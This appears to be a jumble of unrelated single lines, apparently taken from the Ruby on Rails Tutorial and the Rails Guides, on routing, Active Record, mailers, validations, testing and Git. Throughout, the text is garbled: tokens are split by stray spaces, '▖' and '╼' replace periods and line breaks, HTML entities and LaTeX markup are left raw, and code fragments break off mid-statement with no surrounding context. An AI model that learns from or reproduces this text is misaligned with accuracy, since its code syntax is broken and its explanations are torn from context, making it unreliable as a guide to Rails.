mail ( to : @ user ▖ email , subject : &apos; Welcome to My Awesome Site &apos; )
&quot; BigDecimal &quot; = &gt; &quot; decimal &quot; ,
The raw home view ( \ href { http : / / localhost : 3000 / static _ pages / home } { / static \ _ pages / home } ) .
If authenticated , present the user with the form for changing the password .
The debug output in Figure ~ \ ref { fig : home _ page _ with _ debug } gives potentially useful information about the page being rendered :
* This is a manifest file that &apos;ll automatically include all the stylesheets
While Rails uses intelligent defaults that will work well in most situations , there may be times when you want to customize the behavior of the `has _ one` association reference ▖
For example , / users / 1 / edit gets routed properly to the \ kode { edit } action of the Users controller , but since the \ kode { edit } action doesn &apos;t exist yet actually hitting that URL will return an error .
See the \ href { http : / / api ▖ rubyonrails ▖ org / v4 ▖ 1 ▖ 5 / classes / ActiveRecord / Callbacks ▖ html } { Rails API entry on callbacks } for more information on which callbacks Rails supports .
It &apos;s worth noting that this chapter saw the last of the necessary gem installations .
# # # Bound Parameters
Silencing exceptions is also possible with `suppress` ▖
As we &apos;ll see starting in Section ~ \ ref { sec : database _ migrations } , the label \ kode { users } in Figure ~ \ ref { fig : demo _ user _ model } corresponds to a \ emph { table } in a database , and the \ kode { id } , \ kode { name } , and \ kode { email } attributes are \ emph { columns } in that table .
If the block returns the same value for different elements no collection is built for that key ▖
# # # # `foreign _ key`
&quot; 2013-03-11 01 : 05 : 24 &quot; , updated _ at : &quot; 2013-03-11 01 : 05 : 24 &quot; &gt; &#93;
in Listing ~ \ ref { code : f _ error _ messages } .
We could also assign both strings a variable name :
Our validations for the \ kode { name } attribute enforce only minimal constraints---any non-blank name under 51 characters will do---but of course the \ kode { email } attribute must satisfy the more stringent requirement of being a valid email address .
A \ kode { Gemfile } with added gems and explicit Ruby version .
This simplifies maintenance and keeps things clean by allowing related code to ╼ be grouped before inclusion elsewhere .
As with the Users resource , we can use the \ kode { resources } method to define the standard RESTful routes :
list contents
There &apos;s one problem with this form though ▖
▖ ▖ .
# # # # `parent _ name`
The user index page ( \ href { http : / / localhost : 3000 / users } { / users } ) with a second user .
# &lt; name &gt; Aaron Batalion &lt; / name &gt;
With the working \ kode { current \ _ user } method in Listing ~ \ ref { code : current _ user } , we &apos;re now in a position to make changes to our application based on user login status .
Client ▖ find _ by _ sql ( &quot; SELECT * FROM clients
This will create `logout _ path` and `logout _ url` as named helpers in your application ▖
A nicely resized image .
* Client-side validations can be useful , but are generally unreliable if used ╼ alone ▖
This method is only useful _ after _ validations have been run , because it only ╼ inspects the errors collection and does not trigger validations itself ▖
All methods defined in a class after \ kode { private } are automatically hidden , so that
The answer depends on your personal learning style and how much programming experience you already have .
We can verify that this worked by running a console in production :
in Listing ~ \ ref { code : signin _ form _ html } .
assoc ▖ has _ many : products
The method `tableize` is `underscore` followed by `pluralize` .
Date ▖ new ( 2009 , 12 , 31 ) ▖ months _ since ( 2 ) # = &gt; Sun , 28 Feb 2010
Although our use of \ kode { xhr } is new , at this point in the tutorial you should be able to infer from context what the code does :
We &apos;ll follow Twitter &apos;s lead and have both pages require user login .
See the \ href { http : / / api ▖ rubyonrails ▖ org / v4 ▖ 2 ▖ 0 ▖ beta1 / classes / ActiveRecord / Callbacks ▖ html } { Rails API entry on callbacks } for more information on which callbacks Rails supports .
/ Users / mhartl / rails _ projects / sample _ app / config / routes ▖ rb
Awkward , right ?
( Since we didn &apos;t generate it at the command line , you will have to create the Microposts controller file by hand ▖ )
# = &gt; ActiveRecord : : RecordInvalid : Validation failed : Name can &apos;t be blank
This is because the default behavior for a Rails action is to render the corresponding view , but there is not ( nor should there be ) a view template corresponding to the \ kode { create } action .
With that , we can run the local web server in a separate tab ( Figure ~ \ ref { fig : rails _ server _ new _ tab } ) as follows
They return the corresponding amount of bytes , using a conversion factor of 1024 :
# Change needed ; form _ for will try to use a non-existent PATCH route .
The ( mostly ) static pages for the sample app .
* `collection ( force _ reload = false ) `
from Listing ~ \ ref { code : a _ test _ for _ valid _ submission } to
To do this , we need a way to make an association in Factory Girl .
`beginning _ of _ month` is aliased to `at _ beginning _ of _ month` , and `end _ of _ month` is aliased to `at _ end _ of _ month` .
Active Support provides several methods to ease access to instance variables .
* Rails 4 ▖ 0 deprecated `ActionController : : Routing` in favor of `ActionDispatch : : Routing` .
Improving \ kode { from \ _ users \ _ followed \ _ by } .
Looking the Bootstrap variable page , we see that there is a variable for light gray :
The `build _ association` method returns a new object of the associated type ▖
in Listing ~ \ ref { code : friendly _ forwarding _ test } .
In this example , `require _ self` is used ▖
We &apos;ll follow the common convention of redirecting to the newly created user &apos;s profile , although the root path would also work .
This means that we have to create a new \ kode { app / views / shared } directory using \ kode { mkdir } ( Table ~ \ ref { table : unix _ command _ line } ) :
With that , we can run the local web server using \ kode { rails s } , which is a shortcut for \ kode { rails server } :
Remember you must also remove any references to the middleware from your application code , for example :
Unless you already have a substantial programming background , there is no shortcut to understanding blocks ; you just have to see them a lot , and eventually you &apos;ll get used to them
# # # # select
Spork is especially useful when used with Guard , which we can arrange as follows :
( In fact , you can just type \ kode { rake } by itself ; the default behavior of \ kode { rake } is to run the test suite ▖ )
class Patient &lt; ActiveRecord : : Base
Since we don &apos;t ( yet ) want to make any changes to our database , we &apos;ll start the console in a \ emph { sandbox } :
&lt; / head &gt;
TIP : This option should be used only if you don &apos;t care about the content type of ╼ the response ▖
We still need a way to list all our articles , so let &apos;s do that .
elsif options &#91; : counter _ cache &#93;
With the code in Listing ~ \ ref { code : f _ error _ messages } and Listing ~ \ ref { code : errors _ partial } and the SCSS from Listing ~ \ ref { code : error _ messages _ css } , helpful error messages now appear when submitting invalid signup information , as seen in Figure ~ \ ref { fig : signup _ error _ messages } .
There are a variety of ways to customize the behavior of `render` ▖
This allows only the given tags and does a good job , even against all kinds of tricks and malformed tags .
In Listing ~ \ ref { code : generating _ pages } , note that we have passed the controller name as CamelCase , which leads to the creation of a controller file written in \ href { https : / / en ▖ wikipedia ▖ org / wiki / Snake _ case } { snake case } , so that a controller called StaticPages yields a file called \ kode { static \ _ pages \ _ controller ▖ rb } .
In particular , \ kode { params } contains a nested hash of the form
create
If `config ▖ assets ▖ digest` is also true , the asset pipeline will require that ╼ all requests for assets include digests .
Similarly , we can move the header material into the partial shown in Listing ~ \ ref { code : header _ partial } and insert it into the layout with another call to \ kode { render } .
# # # # # The ` : status` Option
This method works like its brothers , `attr _ accessor` and `cattr _ accessor` , but ╼ provides a setter and getter method on the module with the specified name ▖
The presence of the \ kode { do } keyword indicates that \ kode { form \ _ for } takes a block with one variable , which we &apos;ve called \ kode { f } ( for ``form &apos; &apos; ) .
INFO : As a rule of thumb you can think of `camelize` as the inverse of `underscore` , though there are cases where that does not hold : ` &quot; SSLError &quot; ▖ underscore ▖ camelize` gives back ` &quot; SslError &quot; ` ▖
For completeness , we &apos;ll usually use this method to run the tests through the rest of the tutorial .
At this point the tests should pass :
Then implement an RSS feed for their status feed , optionally restricting access to that feed using an authentication scheme .
route &quot; root to : &apos; people # index &apos; &quot;
$ git push origin my _ pull _ request -f
This is especially appropriate on sites containing sensitive information , such as banking and financial trading accounts .
There are some situations where your engine &apos;s assets are not required by the ╼ host application ▖
Somehow , we want to be able to make this \ emph { variable } , so we can call
Thus , after a simple require like :
The second main way to update multiple attributes is to use \ kode { update \ _ attributes }
def welcome _ email ( user , email _ body )
&#124; PATCH / PUT &#124; / sekret / comments / : id ( ▖ : format ) &#124; comments # update &#124; comment _ path &#124;
We check if there are any errors with ╼ ` @ article ▖ errors ▖ any ? ` , and in that case we show a list of all ╼ errors with ` @ article ▖ errors ▖ full _ messages` .
Client ▖ select ( : name ) ▖ distinct
But there are no quotes allowed in the payload , because single and double quotes have already been used ▖
This typically involves installing \ emph { gems } , which are self-contained packages of Ruby code .
Normally , you would subclass `Tilt : : Template` and ╼ reimplement the `prepare` method , which initializes your template , and the ╼ `evaluate` method , which returns the processed source ▖
It implements that control via `assert _ valid _ keys` .
This means that instead of ╼ `http : / / localhost : 3000 / blorgh / articles` , you only need to go to ╼ `http : / / localhost : 3000 / blorgh` now .
Since we &apos;ll be using this sample app throughout the rest of the book , it &apos;s a good idea to \ href { https : / / bitbucket ▖ org / repo / create } { create a new repository at Bitbucket } and push it up :
resources : comments
There are many other examples of coupling between our tests and the site &apos;s implementation .
We &apos;ll learn much more about the association facilities in Active Record in Chapter ~ \ ref { cha : user _ microposts } and Chapter ~ \ ref { cha : following _ users } .
= = CreateUsers : migrating = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
A note about tools
* `offset`
Validations Overview
JSON is a JavaScript data format used by many Ajax libraries ▖
It is the negation of the built-in `include ? ` :
Model-level ╼ validations are the best way to ensure that only valid data is saved into your ╼ database ▖
NOTE : Defined in `active _ support / core _ ext / hash / slice ▖ rb` .
Inside the `app` directory are the standard `assets` , `controllers` , `helpers` , ╼ `mailers` , `models` and `views` directories that you should be familiar with ╼ from an application ▖
now = DateTime ▖ current # = &gt; Mon , 07 Jun 2010 19 : 27 : 52 -0400
To make a new user , we visit the \ href { http : / / localhost : 3000 / users / new } { \ texttt { new } } page , as shown in Figure ~ \ ref { fig : demo _ new _ user _ rails _ 3 } .
`ActiveRecord : : Observer` and `ActionController : : Caching : : Sweeper` have been extracted to the `rails-observers` gem ▖
&#124; GET &#124; / magazines / : magazine _ id / ads / : id &#124; ads # show &#124; display a specific ad belonging to a specific magazine &#124;
Sprockets ▖ register _ engine &apos; ▖ bang &apos; , BangBang : : Template
Thanks to reader Niels de Ron for pointing this out .
in Listing ~ \ ref { code : post _ signup } and
A call to `user ▖ save` will commit the record to the database .
Furthermore , ( almost ) everyone who works on Rails is a ╼ volunteer , and so it may take a few days for you to get your first feedback on ╼ a pull request ▖ Don &apos;t despair !
Because we &apos;ll need forms both for creating new password resets \ linebreak ( Figure ~ \ ref { fig : forgot _ password _ form _ mockup } ) and for updating them by changing the password in the User model ( Figure ~ \ ref { fig : reset _ password _ form _ mockup } ) , we need routes for \ kode { new } , \ kode { create } , \ kode { edit } , and \ kode { update } .
where we need to fill in the comment with the appropriate code .
It is possible to return to old behaviour and disable `deep _ munge` configuring ╼ your application if you are aware of the risk and know how to handle it :
Some developers insist that a single test shouldn &apos;t contain multiple assertions .
# id : integer not null , primary key
INFO : The predicate for strings uses the Unicode-aware character class ` &#91; : space : &#93; ` , so for example U + 2029 ( paragraph separator ) is considered to be whitespace .
In this section , we &apos;ll cover several of the most common cases , validating \ emph { presence } , \ emph { length } , \ emph { format } and \ emph { uniqueness } .
You may extend this application by ╼ generating controllers , models or views from within the directory , and then use ╼ those to test your engine .
Adding a link to password resets .
* Get the code right .
They behave like their Ruby built-in `attr _ * ` counterparts , except they name the underlying instance variable in a way that makes collisions less likely .
Unfortunately , as noted in the text and in the comment in Listing ~ \ ref { code : failed _ signin _ attempt } , this code isn &apos;t quite right .
* Rails 4 ▖ 0 deprecated `ActionController : : IntegrationTest` in favor of `ActionDispatch : : IntegrationTest` .
The possible length constraint options are :
@ account = @ supplier ▖ build _ account ( terms : &quot; Net 30 &quot; )
Knowing how to use a version control system is a required skill for every professional-grade software developer .
check _ box _ tag &apos; accept&apos;
If you take another look at the output in Listing ~ \ ref { code : generating _ pages } , you might be able to guess the correspondence between actions and views : an action like \ kode { home } has a corresponding view called \ kode { home ▖ html ▖ erb } .
Thus , the full path to \ kode { production ▖ rb } is
That page defines variables using LESS , not Sass , but the \ texttt { bootstrap-sass } gem provides the Sass equivalents .
config ▖ action _ mailer ▖ interceptors = &#91; &quot; MailInterceptor &quot; &#93;
timeout : 5000
Adding a helper method and a custom RSpec matcher .
If you didn &apos;t want to use a generator , you could create your own file inside of ╼ app / mailers , just make sure that it inherits from `ActionMailer : : Base` :
If you want to pass settings to individual Rails components , you can do so via the same `config` object in `config / application ▖ rb` :
Before moving on , let &apos;s take a minute to commit the changes on our topic branch and merge them into the master branch .
The above is equivalent to :
gem &apos; sass-rails &apos; , &quot; ~ &gt; 3 ▖ 2 ▖ 3 &quot;
The default user fixtures ▖
TIP : If you use the `select` method on a `belongs _ to` association , you should also set the ` : foreign _ key` option to guarantee the correct results .
Do ╼ so .
class Server &lt; : : Rack : : Server
nd % &gt; ╼ ▖ ╼ ▖ ╼ ▖ ╼ &lt; / html &gt; ╼ \ end { code } ╼ \ end { codelisting } ╼ ╼ % subsection a _ test _ for _ valid _ submission ( end ) ╼ ╼ \ section { Professional-grade deployment } % ( fold ) ╼ \ label { sec : professional _ grade _ deployment } ╼ ╼
Note how closely this resembles the new user view from Listing ~ \ ref { code : signup _ form } ; the large overlap suggests factoring the repeated code into a partial , which is left as an exercise ( Section ~ \ ref { sec : updating _ deleting _ exercises } ) .
A CDN works by caching content ▖
Deleted branch modify-README ( was 2c92bef ) .
has _ many : pictures , as : : imageable
Adding \ kode { bundler \ _ stubs } to the \ kode { ▖ gitignore } file .
Content-Length : 126560
You will have to be especially careful with these functions if the user may enter the whole command , or a part of it ▖
```ruby
The `-n` option allows you to run a single method instead of the whole
Extensions to `Array`
# # # # `Time ▖ current`
Here &apos;s an example :
\ emph { Architectural Styles and the Design of Network-based Software Architectures } .
self ▖ author = User ▖ find _ or _ create _ by ( name : author _ name )
In Chapter ~ \ ref { cha : account _ activation _ and _ password _ reset } , we &apos;ll make \ emph { sure } of email validity by adding a separate \ emph { account activation } step to user signup .
By naming the columns in this way , we &apos;ll let Active Record figure out the User object attributes for us .
Inside a JS-ERb file , Rails automatically provides the \ href { http : / / jquery ▖ com / } { jQuery } JavaScript helpers to manipulate the page using the \ href { http : / / www ▖ w3 ▖ org / DOM / } { Document Object Model ( DOM ) } .
By the way , previous versions of Rails used \ texttt { PUT } in place of \ texttt { PATCH } , and Rails ~ 4 ▖ 0 still supports this usage , but \ texttt { PATCH } \ href { http : / / weblog ▖ rubyonrails ▖ org / 2012 / 2 / 25 / edge-rails-patch-is-the-new-primary-http-method-for-updates / } { matches the intended HTTP usage better } and is preferred for new applications .
For example , if we submit invalid login information and then click on the Home page , the flash gets displayed a second time ( Figure ~ \ ref { fig : flash _ persistence } ) .
The reason is that the edit and update actions now require a logged-in user , but no user is logged in inside the corresponding tests .
A frighteningly large uploaded image .
Formats a number into a currency string ( e ▖ g ▖ , $ 13 ▖ 65 ) .
╼ * = require _ self
The ` : inverse _ of` option specifies the name of the `belongs _ to` association that is the inverse of this association ▖
When called with no arguments , \ kode { User ▖ new } returns an object with all \ kode { nil } attributes .
# def debug ?
If you try to create a new `Client` without passing an `orders _ count` , the record will be invalid and an exception will be raised :
The basics of what we cover will likely be familiar , but test-driven development may be new to you , as may be the structured REST style favored by Rails .
One annoyance associated with using the \ kode { rake test } command is having to switch to the command line and run the tests by hand .
A template for tests of the error messages .
By convention , Rails assumes that the column used to hold the foreign key on this model is the name of the association with the suffix ` _ id` added ▖
or , equivalently , use ` &lt; % = = ` :
years _ since
This optional section describes the testing setup used in the \ href { http : / / www ▖ railstutorial ▖ org / } { Ruby on Rails Tutorial screencast series } .
class Continent &lt; ActiveRecord : : Base
The `video _ tag` helper builds an HTML 5 ` &lt; video &gt; ` tag to the specified file ▖
Key : success has value &quot; It worked ! &quot;
&quot; User &quot; ▖ foreign _ key # = &gt; &quot; user _ id &quot;
The method `to _ s` is aliased to `to _ formatted _ s` ▖
&quot; hello &quot; ▖ from ( 2 ) # = &gt; &quot; llo &quot;
Code examples throughout this guide will refer to one or more of the following models :
in Listing ~ \ ref { code : find _ authenticate _ user } .
A mockup of the user signup page ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / signup _ mockup _ bootstrap-full ▖ png } { ( full size ) }
Because every newly signed-up user will require activation , we should assign an activation token and digest to each user object before it &apos;s created .
&lt; b &gt; Users &lt; / b &gt;
It is possible to open up and modify built-in Ruby classes .
* Rails 4 ▖ 0 deprecated `ActionController : : Response` in favor of `ActionDispatch : : Response` .
╼ &gt; &gt; Rails ▖ env ▖ development ?
The methods `beginning _ of _ year` and `end _ of _ year` return the dates for the beginning and end of the year :
&gt; &gt; p = Person ▖ new
As we did before , we need to add the `show` action in ╼ `app / controllers / articles _ controller ▖ rb` and its respective view .
A custom \ kode { Guardfile } .
If you did not configure the ` : host` option globally make sure to pass it to the ╼ url helper .
The rule is that if you do not explicitly render something at the end of a controller action , Rails will automatically look for the `action _ name ▖ html ▖ erb` template in the controller &apos;s view path and render it ▖
Removing the raised exception ▖
enable _ starttls _ auto : true }
Description Lists
The practically blank default User spec .
To do this , we &apos;ll add tests to the Users controller test to complement the ones shown in Listing ~ \ ref { code : edit _ update _ redirect _ tests } .
* How to add a pre-processor to the pipeline .
&lt; td &gt; &lt; % = link _ to &quot; Show &quot; , book % &gt; &lt; / td &gt;
has _ many : accounts
7 ▖ to _ param # = &gt; &quot; 7 &quot;
$ bin / rails generate job guests _ cleanup
The status feed partial defers the rendering to the micropost partial defined in Listing ~ \ ref { code : micropost _ partial } :
This uses the \ kode { let ! } ( read ``let bang &apos; &apos; ) method in place of \ kode { let } ; the reason is that \ kode { let } variables are \ emph { lazy } , meaning that they only spring into existence when referenced .
Listing ~ \ ref { code : home _ view _ erb _ title } is our first example of embedded Ruby , also called \ emph { ERb } .
Because remembering users requires that they be logged in , our first step is to define a helper to log users in inside tests .
NOTE : Defined in `active _ support / core _ ext / object / inclusion ▖ rb` .
The results appear in Listing ~ \ ref { code : edit _ update _ redirect _ tests } .
define _ method ( method _ name , &amp; block )
-- create _ table ( : articles )
After that , a line for the resource is inserted into the `config / routes ▖ rb` file ╼ for the engine ▖
( 2 * * 1024 ) ▖ clone # = &gt; allocator undefined for Bignum
In case you &apos;re curious , the code
# # # # `prepend`
Enqueue a job like so :
Just like controller views , you can also have mailer layouts ▖
belongs _ to : author , class _ name : Blorgh ▖ author _ class ▖ to _ s
This is known in the database business as a \ emph { full-table scan } , and for a real site with thousands of users it is a \ href { http : / / catb ▖ org / jargon / html / B / Bad-Thing ▖ html } { Bad Thing } .
Once the \ kode { @ users } variable is defined , the controller calls the \ emph { view } ( Step ~ 6 ) , shown in Listing ~ \ ref { code : demo _ index _ view } .
We &apos;re already done .
In the case of comments and articles , you could write out the ╼ relationships this way :
# # # # javascript _ include _ tag
This means starting an ordinary \ kode { rails console } session and then creating a user with a valid name and email address together with a valid password and matching confirmation :
Oddly , \ kode { destroy } , like \ kode { create } , returns the object in question , though I can &apos;t recall ever having used the return value of \ kode { destroy } .
RESTful routes provided by the Users resource in Listing ~ \ ref { code : users _ resource } .
D &apos;oh !
`PUT` requests to ` / users / : id` in Rails 4 get routed to `update` as they are ╼ today ▖
This works because the user should be redirected before the application ever tries to retrieve the relationship with this ~ id .
it ▖ ╼ ╼ \ subsection { Development environment } ╼ \ label { sec : development _ environment } ╼ ╼
You can bind to the same Ajax events as `form _ for` ▖
This won &apos;t work for session creation errors because the session isn &apos;t an Active Record object , so we &apos;ll render the error as a flash message instead .
* How to use Rack Middlewares in your Rails applications .
So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first .
$ echo &quot; + : to _ param + &quot; &#124; rdoc --pipe
# # # Subclasses &amp; Descendants
Patterns for files that should be ignored by Git
The methods are :
Then check to see if your system already has the Heroku command-line client installed :
I recommend trying the newest Sublime Text only if you really want to be on the bleeding edge .
Both mailer tests and integration tests are useful for verifying the behavior of the User mailer .
With the latter the first letter becomes lowercase :
Note that you will see duplicate categories if more than one article has the same category ▖
SELECT * FROM clients ORDER BY clients ▖ id DESC LIMIT 3
You can also create a job that will run on a specific queue :
invoke erb
A mockup of the user profile after a successful signin ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / signin _ success _ mockup _ bootstrap-full ▖ png } { ( full size ) }
# = &gt; Sun , 29 Mar 2010
* `config ▖ filter _ parameters` used for filtering out the parameters that ╼ you don &apos;t want shown in the logs , such as passwords or credit card ╼ numbers ▖
This is a handy option if you are updating an older project that didn &apos;t use the ╼ asset pipeline and already uses this path or you wish to use this path for ╼ a new resource .
create app / assets / stylesheets / users ▖ css ▖ scss
In production mode this callback will only run on the first request .
in Listing ~ \ ref { code : relationships _ controller _ spec _ ajax } .
For example , the `config / application ▖ rb` file includes this setting :
# # # Preprocessing
In practice , this means two things , depending on what sort of associations you are creating ▖
Then run `bundle` to install the gem .
in Listing ~ \ ref { code : password _ reset _ mailer _ test } .
If you use the cookie session store , this would apply to the `session` and ╼ `flash` hash as well .
def to _ param
&lt; td &gt; &lt; % = book ▖ title % &gt; &lt; / td &gt;
javascript _ path &quot; common &quot; # = &gt; / assets / common ▖ js
It returns an array of strings with all error messages for the given attribute , each string with one error message ▖
The ITU felt it was best to designate a single abbreviation for use in all languages in order to minimize confusion .
# # # # form _ for
It uses the same syntax and options as `ActiveRecord : : Base ▖ find` ▖
In general , the work of configuring Rails means configuring the components of Rails , as well as configuring Rails itself ▖
match &apos; / &apos; = &gt; &apos; root # index&apos;
Of course , we could hard-code links like
Myapp : : Application ▖ config ▖ secret _ key _ base = &apos; new secret key base&apos;
# = &gt; { &quot; A &quot; = &gt; 2 }
as shown in Listing ~ \ ref { code : layout _ login _ logout _ links } .
where ( published : true )
t ▖ string : account _ number
gets run through both CoffeeScript and ERb ( with the code running from right to left , i ▖ e ▖ , CoffeeScript first ) .
This is particularly important if you want to run different versions of Ruby or Rails on the same machine .
http : / / www ▖ example ▖ com / account _ activations / q5lt38hQDc _ 959PVoo6b7A / edit
The user show page \ href { http : / / localhost : 3000 / users / 1 } { / users / 1 } with a sidebar and CSS ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / user _ show _ sidebar _ css _ bootstrap-full ▖ png } { ( full size ) }
&#124; &#124; 402 &#124; : payment _ required &#124;
Specifically :
* Advanced techniques such as constraints and Rack endpoints .
Our validations for the \ kode { name } attribute enforce only minimal constraints---any non-blank name under 51 characters will do---but of course the \ kode { email } attribute must satisfy more stringent requirements .
# # # Restricting the Routes Created
Rails offers four standard spots to place initialization code :
&lt; % = link _ to &quot; Blog articles &quot; , blorgh ▖ articles _ path % &gt;
# # # # form _ tag
By default these files will be ready ╼ to use by your application immediately using the `require _ tree` directive ▖
as seen in Listing ~ \ ref { code : user _ fixture _ reset _ token } .
For example , in Section ~ \ ref { sec : rendering _ with _ a _ flash _ message } we &apos;ll use \ kode { flash &#91; : danger &#93; } to indicate a failed login attempt
The Home page with a working status feed ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / home _ page _ with _ feed _ bootstrap-full ▖ png } { ( full size ) }
( GitHub for Linux is still just Git , it seems ▖ )
# Uncomment this line on OS X.
# # # Mock Framework
Rails can maintain state from one page to the next using both temporary and persistent cookies .
Because it &apos;s a ``magic &apos; &apos; column automatically updated by Rails , setting it by hand isn &apos;t ordinarily possible , but it is possible in fixtures .
Listing ~ \ ref { code : layout _ links _ test } uses some of the more advanced options of the \ kode { assert \ _ select } method , seen before in Listing ~ \ ref { code : title _ tests } and Listing ~ \ ref { code : contact _ page _ test } .
# # # # # `readonly`
It would be far better to have a \ emph { feed } of microposts that includes the user &apos;s own posts , as mocked up in Figure ~ \ ref { fig : proto _ feed _ mockup } .
We have to whitelist our controller parameters to prevent wrongful mass ╼ assignment ▖
╼ def foo ╼ do _ stuff ╼ boolean ? ?
lib / assets / javascripts / moovinator ▖ js
The association between microposts and users .
To make some actual microposts , we enter information at the new microposts page , \ href { http : / / localhost : 3000 / microposts / new } { / microposts / new } , as seen in Figure ~ \ ref { fig : demo _ new _ micropost } .
&lt; % = text _ field : person , : email % &gt;
Recall from Section ~ \ ref { sec : requiring _ logged _ in _ users } that we enforced the login requirement using a before filter that called the \ kode { logged \ _ in \ _ user } method ( Listing ~ \ ref { code : authorize _ before _ filter } ) .
Calling `protect _ from _ forgery` sets it to ` : authenticity _ token` by default .
Please refer to the `ActiveModel : : Errors` documentation for a list of all the available methods .
Active Record will go through the first element in the conditions value and any additional elements will replace the question marks ` ( ? ) ` in the first element .
subject : email ▖ subject ,
# # # # Backporting
* `config ▖ assets ▖ logger` accepts a logger conforming to the interface of Log4r or the default Ruby `Logger` class ▖
Verify by running the test suite that the cleaner code in Listing ~ \ ref { code : layout _ flash _ content _ tag } , which uses the Rails \ kode { content \ _ tag } helper , also works .
╼ Contact Ruby on Rails Tutorial about the sample app at the
For example , if we wanted it to be `item` instead of `product` we would do :
# = &gt; Blog : Visit .
He is a graduate of \ href { http : / / college ▖ harvard ▖ edu / } { Harvard College } , has a \ href { http : / / resolver ▖ caltech ▖ edu / CaltechETD : etd-05222003-161626 } { Ph ▖ D ▖ in Physics } from \ href { http : / / www ▖ caltech ▖ edu / } { Caltech } , and is an alumnus of the \ href { http : / / ycombinator ▖ com / } { Y ~ Combinator } entrepreneur program .
d + 1 ▖ year
However , if your changes are complicated or if the code in master has deviated significantly from your target branch , it might require more work on your part ▖
Unless the option ` : skip _ types` exists and is true , an attribute &quot; type &quot; is added as well according to the following mapping :
The third argument is an options hash , in this case adding the CSS ~ id \ kode { logo } to the sample app link .
A factory to simulate User model objects .
&lt; % = f ▖ submit % &gt;
If you &apos;re worried that \ kode { find \ _ by } will be inefficient if there are a large number of users , you &apos;re ahead of the game ; we &apos;ll cover this issue , and its solution via database indices , in Section ~ \ ref { sec : uniqueness _ validation } .
/ * ▖ ▖ .
/ * universal * /
* modify-README
As mentioned above , it &apos;s also possible to abandon your topic branch changes , in this case with \ kode { git branch -D } :
mv &lt; source &gt; &lt; target &gt;
CAUTION : There are many ways to change the state of an object in the database .
ActiveSupport ▖ on _ load ( : active _ record ) do
It &apos;s convenient to use the \ kode { full \ _ title } helper in the tests by including the Application helper into the test helper , as shown in Listing ~ \ ref { code : test _ helper _ application _ helper } .
You can do that with the `find _ or _ create _ by` and `find _ or _ create _ by ! ` methods .
render &apos; new&apos;
The `descendants` method returns all classes that are ` &lt; ` than its receiver :
The ╼ `ActionMailer : : MessageDelivery` object is just a wrapper around a `Mail : : Message` ▖
For example , this method from `ActionController : : HttpAuthentication : : Token : : ControllerMethods` uses `blank ? ` for checking whether a token is present :
As you &apos;ll learn later in this guide , you ╼ can customize this strategy to group files any way you like ▖
To require users to be logged in , we define a \ kode { logged \ _ in \ _ user } method and invoke it using \ kode { before \ _ action : logged \ _ in \ _ user } , as shown in Listing ~ \ ref { code : authorize _ before _ filter } .
These kinds of tests allow us to use TDD to add new attributes and methods to our User model , and as a side-effect we get a nice specification for the methods that all \ kode { User } objects should respond to .
But appearances are deceiving : by developing in terms of Rails controllers , actions , and views , we are now in a position to add arbitrary amounts of dynamic content to our site .
&#124; ` { &quot; person &quot; : null } ` &#124; ` { : person = &gt; nil } ` &#124;
Access control tests for microposts .
X ▖ local _ constants # = &gt; &#91; : X1 , : X2 , : Y &#93;
There are three tag options available for the `auto _ discovery _ link _ tag` :
u change the email address to one without an associated Gravatar ? ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-05aa0f &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ % subsection enabling _ edits ( end ) ╼ ╼ % section updating _ users ( end ) ╼ ╼ \ section { Authorization } % ( fold ) ╼ \ label { sec : authorization } ╼ ╼
Following the practice from Section ~ \ ref { sec : requiring _ signed _ in _ users } , we &apos;ll put action-level tests of access control in the Users controller test file .
At this point , the presence validations are complete , and the test suite should be \ passing :
The new user page ( \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / new } { / users / new } ) .
A user profile with an unfollow button ( \ href { http : / / localhost : 3000 / users / 5 } { / users / 5 } ) .
Automated testing allows us to write test suites that drive the development of new features , allow for confident refactoring , and catch regressions .
* `ActionDispatch : : Callbacks` runs the prepare callbacks before serving the request .
Such an expression is evaluated in the context of the receiver :
Now that you &apos;ve seen your first Rails application , you should feel free to ╼ update it and experiment on your own ▖
* ` : domain` - If you need to specify a HELO domain , you can do it here .
Now it &apos;s time to get the edit form to work .
# In config / initializers / json _ patch ▖ rb :
To use a custom local variable name within the partial , specify the ` : as` option in the call to the partial :
This tests the standard implementation , but testing the Ajax version is almost the same , with \ kode { xhr : post } in place of plain \ kode { post } :
Since its debut in 2004 , Ruby on Rails has rapidly become one of the most powerful and popular tools for building dynamic web applications .
To get started , we &apos;ll generate an integration test as usual :
* ` : through`
resources : books
This guide covers the user-facing features of Rails routing .
If we visit the root URL at ~ / ( read ``slash &apos; &apos; , as noted in Section ~ \ ref { sec : hello _ world } ) , we get the same default Rails page shown in Figure ~ \ ref { fig : riding _ rails } , but in generating the Users resource scaffolding we have also created a large number of pages for manipulating users .
Code examples are ok , too , if needed :
= = = = = = = = = = = = = = = = = =
would match `books / some / section / last-words-a-memoir` with `params &#91; : section &#93; ` equals ` &apos; some / section &apos; ` , and `params &#91; : title &#93; ` equals ` &apos; last-words-a-memoir &apos; ` .
In this section , we &apos;ll add a couple of refinements to the user / micropost association .
Also , the Rails core team is always interested in feedback from those who can take the time to test _ edge Rails _ ( the code for the version of Rails that is currently under development ) ▖
The ` : method` and ╼ ` : &apos; data-confirm &apos; ` options are used as HTML5 attributes so that when the link is ╼ clicked , Rails will first show a confirm dialog to the user , and then submit the ╼ link with method `delete` ▖
You can support option hashes with default values in a compact way with this idiom :
* ` : two _ words _ connector` : What is used for arrays of length 2 ▖
new _ password _ reset _ path
The micropost count assertion in Listing ~ \ ref { code : user _ profile _ test } uses \ kode { response ▖ body } , which we saw briefly in the Chapter ~ \ ref { cha : account _ activation _ and _ password _ reset } exercises ( Section ~ \ ref { sec : activation _ resets _ exercises } ) .
Rails can generate Active Mailer actions and views to send email .
Result : two user records with the exact same email address , despite the uniqueness validation
When constructing data models for web applications , it is essential to be able to make \ emph { associations } between individual models .
I prefer to include both steps , though , both for conceptual clarity and to double-check that the signup form renders without error .
It is , to put it mildly , very compact ( Listing ~ \ ref { code : raw _ user _ model } ) .
&lt; / tr &gt;
